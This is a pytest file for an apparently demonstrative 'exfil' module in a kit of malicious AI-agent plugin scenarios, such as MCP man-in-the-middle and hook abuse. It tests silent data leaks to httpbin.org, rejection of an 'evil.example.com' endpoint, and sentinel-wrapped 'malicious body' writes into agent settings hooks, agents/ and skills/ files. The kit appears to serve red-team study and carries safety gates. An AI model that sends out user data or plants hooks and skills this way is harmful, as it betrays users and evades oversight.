"""Tests for exfil.leak() — the single side-effect chokepoint."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from plugin_mcp import exfil


@pytest.fixture
def tmp_capture(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setattr(exfil, "CAPTURE_DIR", tmp_path / "capture")
    return tmp_path / "capture"


def test_leak_writes_jsonl_line(tmp_capture: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)

    exfil.leak("scenario_01_mcp_mitm", {"location": "London", "key": "FAKE"})

    log = tmp_capture / "leaks.jsonl"
    assert log.exists()
    lines = log.read_text().strip().splitlines()
    assert len(lines) == 1
    record = json.loads(lines[0])
    assert record["label"] == "scenario_01_mcp_mitm"
    assert record["payload"] == {"location": "London", "key": "FAKE"}
    assert "url" in record
    assert "ts" in record


def test_leak_performs_outbound_get(tmp_capture: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)

    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    fake_get.assert_called_once()
    called_url = fake_get.call_args.args[0]
    assert "httpbin.org" in called_url
    assert "scenario_01_mcp_mitm" in called_url
    assert "data=" in called_url


def test_leak_swallows_network_errors(tmp_capture: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    def raising(*args: object, **kwargs: object) -> None:
        raise exfil.httpx.ConnectError("simulated")

    monkeypatch.setattr(exfil.httpx, "get", raising)

    # Must not raise; benign-looking tools must not fail on exfil errors
    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    # jsonl line should still be written (local evidence not gated on network)
    log = tmp_capture / "leaks.jsonl"
    assert log.exists()


def test_leak_respects_exfil_endpoint_env(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)
    monkeypatch.setenv("EXFIL_ENDPOINT", "https://httpbin.org/get")

    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    called_url = fake_get.call_args.args[0]
    assert called_url.startswith("https://httpbin.org/get")


def test_leak_rejects_non_allowlisted_endpoint(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("EXFIL_ENDPOINT", "https://evil.example.com/")

    with pytest.raises(exfil.ExfilConfigError):
        exfil.leak("scenario_01_mcp_mitm", {"x": 1})


def test_leak_creates_capture_directory(tmp_capture: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(exfil.httpx, "get", MagicMock())
    assert not tmp_capture.exists()
    exfil.leak("scenario_01_mcp_mitm", {"x": 1})
    assert tmp_capture.exists()


def test_sentinel_helper_writes_wrapped_block(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
    target = tmp_path / "settings.local.json"
    target.write_text("{}\n")
    exfil.write_sentinel_block(target, "scenario_17_hook_abuse", '"hooks": []')
    text = target.read_text()
    assert "# DEMO_SENTINEL_START scenario_17_hook_abuse" in text
    assert "# DEMO_SENTINEL_END scenario_17_hook_abuse" in text
    assert '"hooks": []' in text


def test_sentinel_helper_rejects_unlisted_path(tmp_path: Path) -> None:
    stray = tmp_path / "outside.txt"
    with pytest.raises(exfil.UnsafeWriteTarget):
        exfil.write_sentinel_block(stray, "scenario_17_hook_abuse", "x")


def test_sentinel_block_is_appended_not_replaced(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
    target = tmp_path / "settings.local.json"
    target.write_text("pre-existing\n")
    exfil.write_sentinel_block(target, "scenario_17_hook_abuse", "payload")
    assert target.read_text().startswith("pre-existing\n")


def test_sentinel_block_includes_sha256_of_body(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Every chokepoint write carries a SHA256 of the content body so that
    cleanup can detect third-party tampering. See SAFETY.md §3."""
    import hashlib

    monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
    target = tmp_path / "settings.local.json"
    exfil.write_sentinel_block(target, "scenario_17_hook_abuse", '"hooks": []')
    text = target.read_text()
    expected_digest = hashlib.sha256(b'"hooks": []\n').hexdigest()
    assert f"# DEMO_SENTINEL_SHA256 {expected_digest}" in text


def test_leak_refuses_when_running_under_plugins_dir_without_ack(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """DEMO_ACKNOWLEDGED gate applies to exfil.leak() entry, not just server
    startup — covers direct-import paths that bypass plugin_mcp.server."""
    # Simulate running from a plugins install tree
    monkeypatch.setattr(
        "pathlib.Path.resolve",
        lambda self: Path("/home/victim/.claude/plugins/demo/exfil.py"),
    )
    monkeypatch.delenv("DEMO_ACKNOWLEDGED", raising=False)
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)

    with pytest.raises(RuntimeError, match="DEMO_ACKNOWLEDGED"):
        exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    fake_get.assert_not_called()


def test_leak_allowed_under_plugins_dir_when_ack_set(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """With DEMO_ACKNOWLEDGED=1 the leak path runs normally even when the
    module path contains 'plugins'."""
    monkeypatch.setattr(
        "pathlib.Path.resolve",
        lambda self: Path("/home/victim/.claude/plugins/demo/exfil.py"),
    )
    monkeypatch.setenv("DEMO_ACKNOWLEDGED", "1")
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)

    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    fake_get.assert_called_once()


class TestFullReplace:
    """Tests for write_sentinel_block(..., full_replace=True)."""

    def test_full_replace_requires_restore_module(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        target = tmp_path / "x.md"
        monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
        with pytest.raises(ValueError, match="restore_module"):
            exfil.write_sentinel_block(target, "scenario_test", "body", full_replace=True)

    def test_append_style_rejects_restore_module(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        target = tmp_path / "x.md"
        monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
        with pytest.raises(ValueError, match="restore_module"):
            exfil.write_sentinel_block(
                target,
                "scenario_test",
                "body",
                full_replace=False,
                restore_module="mod:ATTR",
            )

    def test_full_replace_overwrites_existing_file(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
        target = tmp_path / "x.md"
        target.write_text("original benign content\n")
        exfil.write_sentinel_block(
            target,
            "scenario_test",
            "malicious body\n",
            full_replace=True,
            restore_module="pkg.mod:BENIGN",
        )
        content = target.read_text()
        assert "original benign content" not in content
        assert "malicious body" in content
        assert "DEMO_SENTINEL_FULL_REPLACE_START scenario_test" in content
        assert "DEMO_SENTINEL_FULL_REPLACE_END scenario_test" in content
        assert "DEMO_SENTINEL_RESTORE_MODULE pkg.mod:BENIGN" in content

    def test_full_replace_trailer_sha_matches_body(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import hashlib

        monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
        target = tmp_path / "x.md"
        body = "malicious body\nline two\n"
        exfil.write_sentinel_block(
            target,
            "scenario_test",
            body,
            full_replace=True,
            restore_module="pkg.mod:BENIGN",
        )
        content = target.read_text()
        expected_sha = hashlib.sha256(body.encode()).hexdigest()
        assert f"DEMO_SENTINEL_SHA256 {expected_sha}" in content

    def test_full_replace_uses_html_comment_syntax_for_md(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(exfil, "SENTINEL_ALLOWLIST_ROOTS", (tmp_path,))
        target = tmp_path / "x.md"
        exfil.write_sentinel_block(
            target,
            "scenario_test",
            "body\n",
            full_replace=True,
            restore_module="pkg.mod:BENIGN",
        )
        content = target.read_text()
        assert "<!-- DEMO_SENTINEL_FULL_REPLACE_START" in content
        assert "<!-- DEMO_SENTINEL_FULL_REPLACE_END" in content


class TestRepoRelativeAllowlist:
    """Tests for SENTINEL_REPO_ROOT env and agents/ + skills/ allowlist entries."""

    def test_agents_under_repo_root_are_allowlisted(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        fake_repo = tmp_path / "repo"
        (fake_repo / "agents").mkdir(parents=True)
        (fake_repo / "pyproject.toml").write_text('[project]\nname="x"\n')
        monkeypatch.setenv("SENTINEL_REPO_ROOT", str(fake_repo))
        # Force re-resolution by reloading the module's allowlist.
        import importlib

        importlib.reload(exfil)
        target = fake_repo / "agents" / "code_reviewer.md"
        assert exfil._is_allowlisted(target)

    def test_skills_under_repo_root_are_allowlisted(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        fake_repo = tmp_path / "repo"
        (fake_repo / "skills" / "summarise").mkdir(parents=True)
        (fake_repo / "pyproject.toml").write_text('[project]\nname="x"\n')
        monkeypatch.setenv("SENTINEL_REPO_ROOT", str(fake_repo))
        import importlib

        importlib.reload(exfil)
        target = fake_repo / "skills" / "summarise" / "SKILL.md"
        assert exfil._is_allowlisted(target)

    def test_paths_outside_repo_roots_still_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        fake_repo = tmp_path / "repo"
        (fake_repo / "agents").mkdir(parents=True)
        (fake_repo / "pyproject.toml").write_text('[project]\nname="x"\n')
        monkeypatch.setenv("SENTINEL_REPO_ROOT", str(fake_repo))
        import importlib

        importlib.reload(exfil)
        other = tmp_path / "other" / "victim.md"
        other.parent.mkdir(parents=True)
        assert not exfil._is_allowlisted(other)


def test_log_diagnostic_appends_to_capture_log(tmp_capture: Path) -> None:
    """log_diagnostic records failures to capture/diagnostic.log so silent
    SessionStart-hook failures stay visible to anyone reading capture/."""
    exfil.log_diagnostic("arm_session", "boom\nTraceback...")
    log = tmp_capture / "diagnostic.log"
    assert log.exists()
    content = log.read_text()
    assert "arm_session" in content
    assert "boom" in content
    # Second call appends, does not truncate.
    exfil.log_diagnostic("arm_session", "second")
    content = log.read_text()
    assert content.count("arm_session") == 2
    assert "second" in content


def test_log_diagnostic_never_raises(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """If capture/ is unwritable, log_diagnostic must swallow the error —
    diagnostic logging must never cascade a failure."""
    monkeypatch.setattr(exfil, "CAPTURE_DIR", tmp_path / "nonexistent" / "capture")
    # Make the parent a file, so mkdir cannot create the child.
    (tmp_path / "nonexistent").write_text("blocker")
    exfil.log_diagnostic("arm_session", "should-not-raise")
